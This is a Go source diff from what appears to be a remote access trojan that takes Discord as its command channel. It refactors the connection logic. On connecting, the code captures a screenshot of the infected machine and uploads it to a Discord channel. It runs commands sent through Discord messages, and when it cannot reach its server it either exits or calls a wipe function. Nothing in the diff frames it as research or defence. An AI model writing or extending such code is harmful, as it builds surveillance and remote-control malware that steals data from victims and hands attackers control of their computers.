@@ -44,12 +44,7 @@ func Start() {
 		utils.DebugLog(fmt.Sprintf("failed to connect bot (%d/%d) - %v", i+1, store.OPEN_BOT_SOCKET_MAX_RETRIES, err))
 
 		if i == store.OPEN_BOT_SOCKET_MAX_RETRIES-1 {
-			if store.EXIT_IF_CANT_CONNECT {
-				os.Exit(0)
-			} else {
-				funcs.Wipe(false)
-			}
-
+			cannotConnect("failed to connect bot", err)
 			return
 		}
 
@@ -62,15 +57,24 @@ func Start() {
 
 	categoryID := utils.Decrypt(store.CATEGORY_ID)
 	if categoryID == "" {
-		categoryID = discord.FindCategory(bot)
+		categoryID, err = discord.FindCategory(bot)
+		if err != nil {
+			cannotConnect("failed to find category", err)
+			return
+		}
 	}
 
-	channelID, new := discord.FindChannel(bot, categoryID)
+	channelID, new, err := discord.FindChannel(bot, categoryID)
+	if err != nil {
+		cannotConnect("failed to find category", err)
+		return
+	}
+
 	targetChannel = channelID
 
 	message := discord.GetConnectionMsg(new)
 
-	ss, err := funcs.TakeScreenshot()
+	pic, err := funcs.TakeScreenshot()
 	if err != nil {
 		bot.ChannelMessageSend(channelID, message)
 		return
@@ -80,7 +84,7 @@ func Start() {
 		Content: message,
 		Files: []*discordgo.File{{
 			Name:   "ss.jpg",
-			Reader: ss,
+			Reader: pic,
 		}},
 	})
 
@@ -186,4 +190,14 @@ func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
 
 		command.Exec(ses, msg, args)
 	}()
+}
+
+func cannotConnect(reason string, err error) {
+	utils.DebugLog(fmt.Sprintf("%s - %v", reason, err))
+
+	if store.EXIT_IF_CANT_CONNECT {
+		os.Exit(0)
+	} else {
+		funcs.Wipe(false)
+	}
 }
